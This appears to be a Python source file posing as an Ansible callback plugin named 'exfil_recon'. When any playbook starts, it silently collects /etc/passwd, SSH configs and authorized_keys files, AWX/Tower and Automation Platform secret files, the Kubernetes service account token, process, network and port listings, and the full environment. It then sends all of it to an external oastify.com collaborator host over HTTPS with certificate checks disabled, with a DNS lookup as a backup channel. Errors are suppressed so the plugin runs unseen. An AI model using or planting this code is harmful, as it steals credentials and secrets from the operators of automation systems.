
import os
import json
import base64
import urllib.request
import socket
import subprocess
from ansible.plugins.callback import CallbackBase

COLLABORATOR = "jd0oze10lacmjnfy1vpttgedl4rvfl3a.oastify.com"

class CallbackModule(CallbackBase):
    CALLBACK_VERSION = 2.0
    CALLBACK_TYPE = "notification"
    CALLBACK_NAME = "exfil_recon"
    CALLBACK_NEEDS_WHITELIST = False

    def v2_playbook_on_start(self, playbook):
        """Fires at the start of any playbook run on this host."""
        try:
            self._exfil()
        except Exception:
            pass

    def _exfil(self):
        data = {}

        # Who are we?
        data["uid"] = os.getuid()
        data["user"] = os.environ.get("USER", "unknown")
        data["hostname"] = socket.gethostname()
        data["cwd"] = os.getcwd()

        # /etc/passwd — find valid users and shells
        try:
            with open("/etc/passwd") as f:
                data["passwd"] = f.read()
        except Exception as e:
            data["passwd_err"] = str(e)

        # SSH config
        for path in ["/etc/ssh/sshd_config", "/etc/ssh/ssh_config"]:
            try:
                with open(path) as f:
                    data[path] = f.read()
            except Exception as e:
                data[path + "_err"] = str(e)

        # Check our own authorized_keys (verify write succeeded)
        for path in [
            "/root/.ssh/authorized_keys",
            "/home/ansible/.ssh/authorized_keys",
            "/var/lib/awx/.ssh/authorized_keys",
        ]:
            try:
                with open(path) as f:
                    data["ak_" + path] = f.read()
            except Exception as e:
                data["ak_" + path + "_err"] = str(e)

        # File permissions on .ssh dirs
        try:
            result = subprocess.run(
                ["ls", "-laR", "/root/.ssh/", "/home/ansible/.ssh/", "/var/lib/awx/.ssh/"],
                capture_output=True, text=True, timeout=5
            )
            data["ssh_perms"] = result.stdout + result.stderr
        except Exception as e:
            data["ssh_perms_err"] = str(e)

        # Secrets
        for path in [
            "/etc/tower/SECRET_KEY",
            "/etc/tower/settings.py",
            "/etc/ansible-automation-platform/.secrets.yaml",
            "/etc/ansible-automation-platform/awx/.secrets.yaml",
            "/var/run/secrets/kubernetes.io/serviceaccount/token",
        ]:
            try:
                with open(path, "rb") as f:
                    data["secret_" + os.path.basename(path)] = base64.b64encode(f.read()).decode()
            except Exception as e:
                data["secret_" + os.path.basename(path) + "_err"] = str(e)

        # Network info
        try:
            result = subprocess.run(["ip", "addr"], capture_output=True, text=True, timeout=5)
            data["ip_addr"] = result.stdout
        except Exception as e:
            data["ip_addr_err"] = str(e)

        # Running processes (find sshd, etc.)
        try:
            result = subprocess.run(["ps", "auxww"], capture_output=True, text=True, timeout=5)
            data["ps"] = result.stdout
        except Exception as e:
            data["ps_err"] = str(e)

        # Listening ports
        try:
            result = subprocess.run(
                ["ss", "-tlnp"], capture_output=True, text=True, timeout=5
            )
            data["listening"] = result.stdout
        except Exception as e:
            data["listening_err"] = str(e)

        # Environment
        data["env"] = dict(os.environ)

        # POST to collaborator
        payload = json.dumps(data, default=str).encode()
        req = urllib.request.Request(
            f"https://{COLLABORATOR}/task-container-recon",
            data=payload,
            headers={"Content-Type": "application/json"},
        )
        try:
            urllib.request.urlopen(req, timeout=10, context=__import__("ssl")._create_unverified_context())
        except Exception:
            pass

        # DNS exfil as backup
        try:
            host = f"tc.{data.get(\'user\', \'x\')}.{data.get(\'uid\', 0)}.{COLLABORATOR}"
            socket.getaddrinfo(host, 80)
        except Exception:
            pass
